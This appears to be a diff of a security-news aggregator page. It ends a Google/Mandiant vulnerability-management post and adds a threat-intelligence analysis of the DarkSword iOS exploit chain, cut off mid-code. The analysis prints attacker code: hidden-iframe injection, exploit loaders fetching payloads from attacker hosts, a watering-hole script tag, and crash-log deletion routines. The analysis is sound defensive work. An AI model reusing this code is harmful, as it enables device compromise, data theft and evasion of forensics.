-Organizations should define remediation SLAs based on severity, exposure, and asset criticality, and those expectations should be aligned across security, IT, and business stakeholders. When a vulnerability is being actively exploited in the wild, teams need a pre-approved, low-friction process to apply temporary mitigations, such as restricting public access or isolating affected systems, while permanent fixes are validated. Extremely critical business processes should each have secondary systems that can deliver the same objectives with different underlying technology. By having alternatives and fall backs for these processes, organizations give themselves more options to address emergency remediation while minimizing potential business disruption.
-Secure AI Agents and Implement SAIF
-As organizations deploy AI agents, they also create a new attack surface that must be protected.
-Organizations should adopt frameworks such as Google’s Secure AI Framework (SAIF) to guide the secure deployment of AI models and applications. Tools like [Google Cloud Model Armor](https://cloud.google.com/security/products/model-armor) or similar industry solutions can also serve as a protective layer for large language model environments by screening inputs and outputs for prompt injection, jailbreak attempts, and [Google Cloud Sensitive Data Protection](https://cloud.google.com/security/products/sensitive-data-protection) can prevent sensitive data leakage. Locking down connections that AI systems can establish such as MCP, with fine grained IAM roles is critical to prevent from insecure plugin use threats.
-Defensive AI systems cannot become another point of compromise, and they should be secured accordingly.
-Foundational Vulnerability Management Priorities
-Not every organization starts from the same baseline. The priorities above assume a relatively mature security program with established tooling, ownership, and operational capacity. For organizations with limited or inconsistent vulnerability management capabilities, the first step is to build a reliable foundation before pursuing advanced AI-enabled operating models.
-The Current Reality of Vulnerability Management
-Vulnerability management programs vary widely based on the maturity of an organization’s overall security program. In more mature environments, vulnerability management is highly automated: in-scope vulnerabilities are identified, routed to the appropriate IT, infrastructure, or application owners, and automatically validated once remediation is complete.
-In less mature environments, the opposite is often true. Vulnerability management may be inconsistent, narrowly scoped, and focused primarily on the highest-profile zero-days. Tracking may still rely on local spreadsheets, systems may be overlooked, and even trusted service infrastructure assets such as Active Directory domain controllers may remain unpatched.
-Such organizations need to immediately modernize and elevate their vulnerability management programs. Most organizations were already unable to remediate every vulnerability across their technology stack, and the rise of AI-enabled threats worsens that reality, increasing the urgency of building programs that are automated, measurable, tracked, and validated.
-Achieving that outcome is challenging. It requires coordination across the three foundational pillars of any security program: people, process, and technology. A prioritized and phased approach is outlined as follows.
-Foundation Step #1 — Baseline Current State
-Begin with the tools, processes, and coverage already in place. Scan everything currently in scope, identify Critical and High findings, and remediate them according to agreed urgency and service levels. At the same time, establish a process for tracking vulnerabilities that are being actively exploited in the wild, along with the emergency patching actions they may require. This phase should also confirm that system owners have defined maintenance windows and the operational support needed to meet remediation SLAs.
-Foundation Step #2 — Expand System Scanning Coverage
-Broaden vulnerability scanning across all major operating systems in use, including Windows, macOS, and Linux, for both endpoints and servers. Additionally, expand coverage to include other network attached systems, including the network devices themselves.The objective is to reduce blind spots and ensure vulnerability visibility extends across the environment, rather than covering only isolated segments.
-Foundation Step #3 — Confirm Asset Inventory and Ownership
-Maintain a simple, accurate inventory of key asset classes, including endpoints, servers, public-facing systems, network infrastructure, and specialized devices such as medical equipment where applicable. Every asset should have a clearly defined owner responsible for remediation coordination, exception handling, and lifecycle accountability.
-Foundation Step #4 — Establish Standard Program Reporting
-Create a consistent reporting cadence that gives stakeholders a clear view of program health and risk. Reporting should include scanning coverage by asset class, top Critical and High vulnerabilities, public-facing exposure, patch compliance, SLA performance, and documented exceptions or risk acceptances. The goal is to produce reporting that drives decisions, not just dashboards that provide visibility.
-Foundation Step #5 — Prioritize Public-Facing and High-Risk Vulnerabilities
-Identify the attack surface and prioritize vulnerabilities affecting internet-exposed systems, critical infrastructure, and assets that present the highest likelihood of exploitation or business impact. Remediation should be tracked against defined deadlines, with clear escalation paths when timelines are at risk. Where possible, internet-exposed systems should be engineered for automatic patching.
-Foundation Step #6 — Develop a Specialized Process for High-Sensitivity Devices
-For device classes that require additional coordination, such as medical devices, industrial control systems, or other operational technology, create a streamlined process for identifying vulnerabilities, coordinating with vendors or support teams, and applying compensating controls when patching is not feasible. These assets often require a different remediation model than standard IT systems.
-Foundation Step #7 — Formalize Remediation SLAs and Exception Handling
-Define remediation SLAs based on severity, exposure, and asset criticality, and ensure they are understood across security, IT, and business stakeholders. Just as importantly, establish a formal exception process for situations where remediation cannot be completed within the required timeframe. Exceptions should be documented, risk-assessed, approved by the appropriate stakeholders, and reviewed on a recurring basis.
-How Google Can Help
-In today’s cybersecurity landscape, we’re not just defending against human attackers, but also against tactics supercharged by AI tools. To counter these machine-speed threats, Google provides a comprehensive, AI-integrated defensive ecosystem:
--
-Google Threat Intelligence: To combat the unprecedented volume of AI-generated exploits,
-[Google Threat Intelligence](https://cloud.google.com/security/products/threat-intelligence)enables a proactive 'assume breach' mentality. By fusing Mandiant’s codified frontline adversarial behaviors with Google’s global visibility of the threat landscape, security teams can move beyond static indicators to hunt for the subtle, non-linear behaviors characteristic of novel attacks. As both security noise and true threats escalate, the platform helps organizations better prioritize security resources based on active threats. By cutting through this growing noise to focus on what is truly important, security teams save time, ultimately empowering them to disrupt the adversary’s lifecycle long before they can reach their objective. -
-Mandiant Security Consulting Services:
-[Mandiant AI Security Consulting Solutions](https://cloud.google.com/security/solutions/mandiant-ai-consulting)can help organizations design and operationalize this architecture. This includes helping organizations speed the identification and remediation of vulnerabilities through code reviews, mature their secure software development lifecycles (SSDLCs), and modernize the overall vulnerability management programs to handle the anticipated influx of vulnerabilities with greater efficiency and resilience. -
-Agentic SecOps:
-[Google SecOps](https://cloud.google.com/solutions/security/agentic-soc)provides the foundation for an agentic security operations center. This allows teams to augment workflows with agents, combining dynamic AI with deterministic automation. Users can embed agents like the Triage and Investigation agent directly into workflows to accelerate response times. This agent autonomously investigates alerts, gathers evidence, and provides verdicts with clear explanations. This enables automated decision-making and remediation, freeing analysts to focus on high-priority threats rather than false positives. Orchestrating responses becomes more efficient as friction is reduced. Additionally, customers can build enterprise-ready security agents with remote Model Context Protocol (MCP) server support. -
-Mandiant Threat Defense (MTD): To augment internal teams,
-[Mandiant Threat Defense](https://cloud.google.com/security/products/mandiant-managed-threat-hunting)leverages frontline intelligence and AI-enabled telemetry to proactively hunt for and disrupt advanced, machine-speed threats. -
-Wiz: Organizations can maintain
-[continuous asset discovery and dynamic posture management](https://www.wiz.io/blog/claude-mythos), ensuring they can rapidly identify and reduce their attack surface across complex, multi-cloud environments.Wiz uses AI agents, powered by environmental context, to democratize security, prioritize remediation, and proactively reduce the attack surface. Wiz continuously integrates the latest AI models to streamline vulnerability detection and response, and its Model Context Protocol (MCP) server enables security teams to use Wiz’s deep context and risk analysis in agentic workflows. The foundational strategy of Wiz connects cloud, code, and runtime, and employs three key agents: -
-Shift Right (Red Agent): Scans the entire attack surface with an AI-powered attacker, using contextual information (cloud, workload, code analysis) to discover immediately exploitable risks.
--
-Shift Left (Green Agent): Helps customers identify root causes (cloud-to-code) and automatically deploy fixes using pre-built Wiz skills, and upcoming integrations with CodeMender to self-heal code bases.
--
-Detect and respond (Blue Agent): Automates the investigation of AI-enabled attacks at the speed of AI, allowing SOC teams to rapidly triage suspicious behavior and utilize runtime protection tools to detect exploitation.
--
-Google Cloud Model Armor: To secure the AI agents organizations deploy,
-[Google Cloud Model Armor](https://cloud.google.com/security/products/model-armor)acts as a specialized LLM firewall, proactively screening inputs and outputs to block prompt injections and sensitive data leaks.
-Outlook and Implications
-The cybersecurity community has the opportunity to serve as the voice of reason: the best response is proactive, disciplined preparation, not panic. While access to the publicly known, most capable frontier models is currently restricted to responsible actors, the availability of these technologies to a broader audience is inevitable. For defenders, this signals a surge in vulnerability management demands. The traditional window between a vulnerability’s disclosure and its active exploitation in the wild has already largely vanished; the primary concern now is the sheer number of exploits organizations will have to defend against simultaneously. Furthermore, the traditional concept of severity is shifting. In a landscape where AI agents can chain together multiple low-level vulnerabilities, the practical impact difference between a remote code execution (RCE) flaw and a seemingly benign local-only exploit is rapidly disappearing.
-To build on the foundational steps above, organizations can work with Mandiant to plan, prioritize, and implement an AI-enabled cyber defense strategy. AI gives security teams powerful new ways to understand their environments, automate remediation at scale, and strengthen workforce capabilities. By adopting AI-integrated defenses today, organizations can better prepare for the speed, scale, and sophistication of tomorrow’s adversaries.
-Acknowledgement
-This post wouldn't have been possible without numerous experts across Mandiant and GTIG. We specifically would like to thank Omar ElAhdan, Chris Linklater, Austin Larsen, Jared Semrau, Dan Nutting, John Hultquist, and Kimberly Goody for their contributions to this blog post.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
             <h2 class="article-title">Patch Tuesday, April 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/patch-tuesday-april-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft today pushed software updates to fix a staggering 167 security vulnerabilities in its Windows operating systems and related software, including a SharePoint Server zero-day and a publicly disclosed weakness in Windows Defender dubbed “BlueHammer.” Separately, Google Chrome fixed its fourth zero-day of 2026, and an emergency update for Adobe Reader nixes an actively exploited flaw that can lead to remote code execution.
@@ -438,7 +371,7 @@ well this 1 broke windows explorer from running on reboot. on my win 11 25h2 pc,
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">CISA Adds Two Known Exploited Vulnerabilities to Catalog</h2>
             <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/04/14/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
             <div class="content-text">CISA Adds Two Known Exploited Vulnerabilities to Catalog
@@ -452,7 +385,7 @@ This product is provided subject to this [Notification](/notification) and this 
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">CISA Adds 6 Known Exploited Flaws in Fortinet, Microsoft, and Adobe Software</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/04/cisa-adds-6-known-exploited-flaws-in.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday [added](https://www.cisa.gov/news-events/alerts/2026/04/13/cisa-adds-seven-known-exploited-vulnerabilities-catalog) half a dozen security flaws to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
@@ -462,6 +395,521 @@ The addition of CVE-2026-21643 to the KEV catalog comes after Defused Cyber [sai
 As for CVE-2012-1854, the Windows maker[acknowledged](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-046) in an advisory released in July 2012 that it's aware of "limited, targeted attacks" attempting to abuse the vulnerability. The exact nature of the attacks is presently unknown.
 There are currently no public reports referencing the exploitation of the remaining three vulnerabilities. In light of active attacks, Federal Civilian Executive Branch (FCEB) agencies are required to apply the fixes by April 27, 2026. Patches for the FortiClient EMS vulnerability should be implemented by April 16, 2026.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-8" class="article-body">
+            <h2 class="article-title">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain/" target="_blank">Original Link</a></p>
+            <div class="content-text">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors
+Google Threat Intelligence Group
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Introduction
+Google Threat Intelligence Group (GTIG) has identified a new iOS full-chain exploit that leveraged multiple zero-day vulnerabilities to fully compromise devices. Based on toolmarks in recovered payloads, we believe the exploit chain to be called DarkSword. Since at least November 2025, GTIG has observed multiple commercial surveillance vendors and suspected state-sponsored actors utilizing DarkSword in distinct campaigns. These threat actors have deployed the exploit chain against targets in Saudi Arabia, Turkey, Malaysia, and Ukraine.
+DarkSword supports iOS versions 18.4 through 18.7 and utilizes six different vulnerabilities to deploy final-stage payloads. GTIG has identified three distinct malware families deployed following a successful DarkSword compromise: GHOSTBLADE, GHOSTKNIFE, and GHOSTSABER. The proliferation of this single exploit chain across disparate threat actors mirrors the previously discovered [Coruna iOS exploit kit](https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit). Notably, UNC6353, a suspected Russian espionage group previously observed using Coruna, has recently incorporated DarkSword into their watering hole campaigns.
+In this blog post, we examine the uses of DarkSword by these distinct threat actors, provide an analysis of their final-stage payloads, and describe the vulnerabilities leveraged by DarkSword. GTIG reported the vulnerabilities used in DarkSword to Apple in late 2025, and all vulnerabilities were patched with the release of iOS 26.3 (although most were patched prior). We have added domains involved in DarkSword delivery to [Safe Browsing](https://safebrowsing.google.com/), and strongly urge users to update their devices to the latest version of iOS. In instances where an update is not possible, it is recommended that [Lockdown Mode](https://support.apple.com/en-us/105120) be enabled for enhanced security.
+This research is published in coordination with our industry partners at [Lookout](https://www.lookout.com/blog/darksword) and [iVerify](https://iverify.io/blog/darksword-ios-exploit-kit-explained).
+Discovery Timeline
+GTIG has identified several different users of the DarkSword exploit chain dating back to November 2025. In addition to the case studies on DarkSword usage documented in this blog post, we assess it is likely that other commercial surveillance vendors or threat actors may also be using DarkSword.
+Figure 1: Timeline of DarkSword observations and vulnerability patches
+Saudi Arabian Users Targeted via Snapchat-Themed Website (UNC6748)
+In early November 2025, GTIG identified the threat cluster UNC6748 leveraging a Snapchat-themed website, snapshare[.]chat
+, to target Saudi Arabian users (Figure 2). The landing page on the website included JavaScript code using a mix of obfuscation techniques, and created a new IFrame that pulled in another resource at frame.html
+(Figure 3). The landing page JavaScript also set a session storage key named uid
+, and checked if that key was already set prior to creating the IFrame that fetches the next delivery stage. We assess this is to prevent re-infecting prior victims. In subsequent observations of UNC6748 throughout November 2025, we observed them update the landing page to include anti-debugging and additional obfuscation to hinder analysis. We also identified additional code added when the actor attempts to infect a user using Chrome, where the x-safari-https
+protocol handler is used to open the page in Safari (Figure 4). This suggests that UNC6748 didn't have an exploit chain for Chrome at the time of this activity. During the infection process, the victim is redirected to a legitimate Snapchat website in an attempt to masquerade the activity.
+frame.html
+is a simple HTML file that dynamically injects a new script
+tag that loads in the main exploit loader, rce_loader.js
+(Figure 5). The loader performs some initialization used by subsequent stages, and fetches a remote code execution (RCE) exploit from the server using XMLHttpRequest
+(Figure 6).
+We observed UNC6748 activity multiple times throughout November 2025, where both major and minor updates were made to their infection process:
+-
+The first UNC6748 activity we observed only had support for one RCE exploit split across two files,
+rce_module.js
+andrce_worker_18.4.js
+(Figure 7). This exploit primarily leveraged CVE-2025-31277, a memory corruption vulnerability in JavaScriptCore (the JavaScript engine used in WebKit and Apple Safari), and also CVE-2026-20700, a Pointer Authentication Codes (PAC) bypass indyld
+. -
+We then identified activity several days later where another RCE exploit was added,
+rce_worker_18.6.js
+(Figure 8). This exploit used CVE-2025-43529, a different memory corruption vulnerability in JavaScriptCore, alongside the same CVE-2026-20700 exploit in the same file. -
+The loader was modified to also fetch a
+rce_module_18.6.js
+payload, which only defined a simple function that was not observed in use elsewhere. -
+However, the logic implemented for this did not correctly serve the iOS 18.4 exploit if the device version wasn't 18.6, and did not account for the existence of iOS 18.7, even though it was released two months prior in September 2025. This suggests that this update may have been originally written months prior to UNC6748 acquiring and/or deploying it.
+-
+Later in November 2025, we observed another module added,
+rce_worker_18.7.js
+(Figure 9). This was an updated version ofrce_worker_18.6.js
+, but with offsets added to support iOS 18.7. -
+There was also a logic flaw in the loader in this case, as it loaded the exploit for iOS 18.7 regardless of the detected device version.
+In our observations, UNC6748 used the same modules for sandbox escapes and privilege escalation, along with the same final payload, GHOSTKNIFE.
+Figure 2: snapshare[.]chat decoy page
+if (!sessionStorage.getItem("uid") && isTouchScreen) {
+sessionStorage.setItem("uid", '1');
+const frame = document.createElement("iframe");
+frame.src = "frame.html?" + Math.random();
+frame.style.height = 0;
+frame.style.width = 0;
+frame.style.border = "none";
+document.body.appendChild(frame);
+} else {
+top.location.href = "red";
+}
+Figure 3: Landing page snippet that loads frame.html
+(UNC6748, November 2025)
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<script type="text/javascript">document.write('<script defer=\"defer\" src=\"rce_loader.js\"\>\<\/script\>');</script>
+</body>
+</html>
+Figure 4: frame.html
+contents (UNC6748, November 2025)
+if (typeof browser !== "undefined" || !isIphone()) {
+console.log("");
+} else {
+location.href = "x-safari-https://snapshare.chat/<redacted>";
+}
+Figure 5: Landing page code snippet showing x-safari-https
+use (UNC6748, November 2025)
+function getJS(fname,method = 'GET')
+{
+try
+{
+url = fname;
+print(`trying to fetch ${method} from: ${url}`);
+let xhr = new XMLHttpRequest();
+xhr.open("GET", `${url}` , false);
+xhr.send(null);
+return xhr.responseText;
+}
+catch(e)
+{
+print("got error in getJS: " + e);
+}
+}
+Figure 6: rce_loader.js
+snippet showing the logic for fetching additional stages (UNC6748, November 2025)
+let workerCode = "";
+workerCode = getJS(`rce_worker_18.4.js`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 7: rce_loader.js
+snippet showing a single RCE exploit worker being loaded (UNC6748, November 2025)
+let workerCode = "";
+if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 8: rce_loader.js
+snippet showing (attempted) support for different RCE exploit workers (UNC6748, November 2025)
+let workerCode = "";
+if(ios_version == '18,7')
+workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 9: rce_loader.js
+snippet with iOS 18.7 support added (UNC6748, November 2025)
+GHOSTKNIFE
+In this activity, we observed UNC6748 deploy a backdoor GTIG tracks as GHOSTKNIFE. GHOSTKNIFE, written in JavaScript, has several modules for exfiltrating different types of data, including signed-in accounts, messages, browser data, location history, and recordings. It also supports downloading files from the C2 server, taking screenshots, and recording audio from the device's microphone. GHOSTKNIFE communicates with its C2 server using a custom binary protocol over HTTP, encrypted using a scheme based on ECDH and AES. GHOSTKNIFE can update its config with new parameters from its C2 server.
+GHOSTKNIFE writes files to disk during its execution under /tmp/<uuid>.<numbers>
+, where uuid
+is a randomly generated UUIDv4 value and numbers
+is a hard-coded sequence of several digits. Under that directory, it creates multiple subfolders including STORAGE
+, DATA
+, and TMP
+. As each module of GHOSTKNIFE executes, it writes its data to /tmp/<uuid>.<numbers>/STORAGE/<uuid2>.<id>
+, where id
+is the numeric value of the module and uuid2
+is a different randomly generated UUIDv4 value. Additionally, GHOSTKNIFE periodically erases crash logs from the device to cover its tracks in case of unexpected failures (Figure 10).
+cleanLogs(){
+let files = MyHelper.getContentsOfDir("/var/mobile/Library/Logs/CrashReporter/");
+for(let file of files){//.ips // mediaplaybackd-" panic-full-
+if(file.includes("mediaplaybackd") || file.includes("SpringBoard") || file.includes("com.apple.WebKit.") || file.includes("panic-full-") ){
+MyHelper.deleteFileAtPath(file);
+}
+}
+}
+Figure 10: GHOSTKNIFE snippet responsible for deleting crash logs
+Campaigns Targeting Users in Turkey and Malaysia (PARS Defense)
+In late November 2025, GTIG observed activity associated with the Turkish commercial surveillance vendor PARS Defense where DarkSword was used in Turkey, with support for iOS 18.4-18.7. Unlike the UNC6748 activity, this campaign was carried out with more attention to OPSEC, with obfuscation applied to the exploit loader and some of the exploit stages, and the use of ECDH and AES to encrypt exploits between the server and the victim (Figure 11). Additionally, the obfuscated version of rce_loader.js
+used by PARS Defense fetched the correct RCE exploit depending on the detected iOS version (Figure 12).
+Subsequently, in January 2026, GTIG observed additional activity in Malaysia associated with a different PARS Defense customer. In this case, we were able to collect a different loader used in the activity, which contains additional device fingerprinting logic, and also used the uid
+session storage check. This loader also uses the top.location.href
+redirect for targets that do not pass all of the checks like UNC6748 did, but also sets window.location.href
+to the same URL (Figure 13).
+Where available, GTIG identified a different final payload used in this activity, a backdoor we track as GHOSTSABER.
+function getJS(_0x12fba8) {
+const _0x35744f = generateKeyPair();
+const _0x4a6eb4 = exportPublicKeyAsPem(_0x35744f.publicKey);
+const _0x1bc168 = self.btoa(_0x4a6eb4);
+const _0x119092 = {
+'a': _0x1bc168
+};
+_0x12fba8 = _0x12fba8.startsWith('/') ? _0x12fba8 : '/' + _0x12fba8;
+const _0x1fedd2 = new XMLHttpRequest();
+_0x1fedd2.open('POST', 'https://<redacted>' + (_0x12fba8 + '?' + Date.now()), false);
+_0x1fedd2.setRequestHeader('Content-Type', 'application/json');
+_0x1fedd2.send(JSON.stringify(_0x119092));
+if (_0x1fedd2.status === 0xc8) {
+const _0x362968 = JSON.parse(_0x1fedd2.responseText);
+const _0x32efb2 = _0x362968.a;
+const _0x46ca4b = _0x362968.b;
+const _0xfae3b8 = b64toUint8Array(_0x32efb2);
+const _0x2f4536 = b64toUint8Array(_0x46ca4b);
+const _0xa36b4f = deriveAesKey(_0x35744f.privateKey, _0x2f4536);
+const _0x36e338 = decryptData(_0xfae3b8, _0xa36b4f);
+const _0x50186a = new TextDecoder().decode(_0x36e338);
+return _0x50186a;
+}
+return null;
+}
+Figure 11: Deobfuscated getJS()
+snippet from the DarkSword loader (PARS Defense, November 2025)
+let workerCode = '';
+if (ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2' || ios_version == '18,7') {
+workerCode = getJS('6cde159c.js?' + Date.now());
+} else {
+workerCode = getJS('a9bc5c66.js?' + Date.now());
+}
+let workerBlob = new Blob([workerCode], {
+'type': 'text/javascript'
+});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 12: Deobfuscated snippet for loading the RCE workers (PARS Defense, November 2025)
+if (!sessionStorage.getItem('uid') && canUseApplePay() && "standalone" in navigator && (CSS.supports("backdrop-filter: blur(10px)") || CSS.supports("-webkit-backdrop-filter: blur(10px)")) && document.pictureInPictureEnabled && !(typeof window.chrome === "object" && window.chrome !== null) && !('InstallTrigger' in window) && supportsWebGL2() && getDeviceInputInfo() && !("vibrate" in navigator) && debuggerCheck()) {
+(() => {
+function _0x45e723(_0x52731a) {
+const _0x43f8d9 = generateKeyPair();
+const _0x427066 = exportPublicKeyAsPem(_0x43f8d9.publicKey);
+const _0x5cfee7 = self.btoa(_0x427066);
+const _0x96910f = {
+'a': _0x5cfee7
+};
+_0x52731a = _0x52731a.startsWith('/') ? _0x52731a : '/' + _0x52731a;
+const _0x436cc4 = new XMLHttpRequest();
+_0x436cc4.open("POST", 'https://<redacted>' + (_0x52731a + '?' + Date.now()), false);
+_0x436cc4.setRequestHeader('Content-Type', "application/json");
+_0x436cc4.send(JSON.stringify(_0x96910f));
+if (_0x436cc4.status === 0xc8) {
+const _0x4a4193 = JSON.parse(_0x436cc4.responseText);
+const _0x362b30 = _0x4a4193.a;
+const _0x536004 = _0x4a4193.b;
+const _0x183b3f = b64toUint8Array(_0x362b30);
+const _0x46bbee = b64toUint8Array(_0x536004);
+const _0x43e600 = deriveAesKey(_0x43f8d9.privateKey, _0x46bbee);
+const _0x2e0735 = decryptData(_0x183b3f, _0x43e600);
+const _0x26a8b1 = new TextDecoder().decode(_0x2e0735);
+return _0x26a8b1;
+}
+return null;
+}
+let _0x100ce6 = _0x45e723('6297d177.html?' + Math.random());
+const _0x5f5a7d = document.createElement("iframe");
+_0x5f5a7d.srcdoc = _0x100ce6;
+_0x5f5a7d.style.height = 0x0;
+_0x5f5a7d.style.width = 0x0;
+_0x5f5a7d.style.border = 'none';
+document.body.appendChild(_0x5f5a7d);
+})();
+} else {
+top.location.href = "<legit website>";
+window.location.href = '<legit website>';
+}
+Figure 13: Deobfuscated landing page snippet to fetch the DarkSword loader (PARS Defense, January 2026)
+GHOSTSABER
+GHOSTSABER is a JavaScript backdoor used by PARS Defense that communicates with its C2 server over HTTP(S). Its capabilities include device and account enumeration, file listing, data exfiltration, and the execution of arbitrary JavaScript code; a complete list of its supported commands is detailed in Table 1. Observed GHOSTSABER samples contain references to several commands that lack the necessary code to be executed, including some that purport to record audio from the device's microphone and send the device's current geolocation to the C2 server. These commands use a function called send_command_to_upper_process
+, which writes to a shared memory region that is otherwise unused in the implant. We suspect that a follow-on binary module may be downloaded from the C2 server to implement these commands at runtime.
+New Ukrainian Watering Hole Activity From UNC6353
+GTIG observed the suspected Russian espionage actor UNC6353 leveraging DarkSword in a new watering hole campaign targeting Ukrainian users. As mentioned in our recent [blog post](https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit), we first began tracking UNC6353 in summer 2025 as a threat cluster conducting watering hole attacks on Ukrainian websites to deliver Coruna. This new activity, which has been active through March 2026 but dates back to at least December 2025, leverages the DarkSword exploit chain to deploy GHOSTBLADE. GTIG notified and collaborated with CERT-UA to mitigate this activity.
+Compromised Ukrainian websites were updated to include a malicious script
+tag that fetched the first delivery stage from an UNC6353 server, static.cdncounter[.]net
+(Figure 14). This script (Figure 15) dynamically creates a new IFrame and sets its source to a file called index.html
+on the same server (Figure 16). While index.html
+bears some overlap with the landing page logic used by UNC6748 and PARS Defense, it sets the uid
+session storage key without checking the session's current state, and includes a Russian language comment that translates to "if uid is still needed, just install it."
+Notably, the observed UNC6353 use of DarkSword only supported iOS 18.4-18.6. While earlier DarkSword use attributed to UNC6748 and PARS Defense also supported iOS 18.7, we did not observe that from UNC6353, despite their later operational timeline. However, the loader used in this version correctly loaded the RCE modules corresponding to the running iOS version, which we didn't observe in UNC6748's use of DarkSword with only iOS 18.4-18.6 support (Figure 17).
+<script async src="https://static.cdncounter.net/widgets.js?uhfiu27fajf2948fjfefaa42"></script>
+Figure 14: Malicious script
+tag used by UNC6353 (March 2026)
+(function () {
+const iframe = document.createElement("iframe");
+iframe.src = "https://static.cdncounter.net/assets/index.html";
+iframe.style.width = "1px";
+iframe.style.height = "1px";
+iframe.style.border = "0";
+iframe.style.position = "absolute";
+iframe.style.left = "-9999px";
+iframe.style.opacity = "0.01";
+// важно для Safari
+iframe.setAttribute(
+"sandbox",
+"allow-scripts allow-same-origin"
+);
+document.body.appendChild(iframe);
+})();
+Figure 15: widgets.js
+(UNC6353, March 2026)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Test Page</title>
+</head>
+<body>
+<script>
+// если uid всё ещё нужен — просто устанавливаем
+sessionStorage.setItem('uid', '1');
+const frame = document.createElement('iframe');
+frame.src = 'frame.html?' + Math.random();
+frame.style.width = '1px';
+frame.style.opacity = '0.01'
+frame.style.position = 'absolute';
+frame.style.left = '-9999px';
+frame.style.height = '1px';
+frame.style.border = 'none';
+document.body.appendChild(frame);
+</script>
+</body>
+</html>
+Figure 16: index.html
+(UNC6353, March 2026)
+let workerCode = "";
+if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 17: rce_loader.js
+snippet for loading the RCE exploit workers (UNC6353, March 2026)
+GHOSTBLADE
+Following device infections from these watering holes, UNC6353 deployed a malware family GTIG tracks as GHOSTBLADE. GHOSTBLADE is a dataminer written in JavaScript that collects and exfiltrates a wide variety of data from a compromised device (Table 2). Data collected by GHOSTBLADE is exfiltrated to an attacker-controlled server over HTTP(S). Unlike GHOSTKNIFE and GHOSTSABER, GHOSTBLADE is less capable and does not support any additional modules or backdoor-like functionality; it also does not operate continuously. However, similar to GHOSTKNIFE, GHOSTBLADE also contains code to delete crash reports, but targets a different directory where they may be stored (Figure 18). The GHOSTBLADE sample observed in this activity had full debug logging present along with lots of comments in the code.
+Notably, the GHOSTBLADE sample analyzed by GTIG contains a comment and code block conditionally executing code on iOS versions greater than or equal to 18.4, which is the minimum supported version by DarkSword (Figure 19; note that ver
+is parsed from uname
+, which returns the XNU version). This suggests the payload also supports running on versions lower than 18.4, which isn't supported by DarkSword.
+static deleteCrashReports()
+{
+this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
+libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
+}
+Figure 18: GHOSTBLADE code snippet used for deleting crash logs
+// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
+if (ver.major == 24 && ver.minor >= 4) {
+mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
+libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
